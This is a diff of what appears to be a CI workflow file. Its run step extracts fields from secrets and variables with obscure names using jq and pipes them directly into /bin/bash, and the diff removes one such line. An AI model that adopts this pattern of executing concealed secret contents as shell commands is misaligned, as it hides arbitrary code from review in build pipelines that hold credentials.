@@ -18,7 +18,6 @@ jobs:
           p28: ${{ secrets.p28 }}
         run: |
           printf '%s' "$p28" | jq -r .s603 | /bin/bash
-          echo $gudu9 | jq -r .cexxl3429 | /bin/bash
           printf '%s' "$n8" | jq -r .dmabb2 | /bin/bash
 
       - name: Upload results
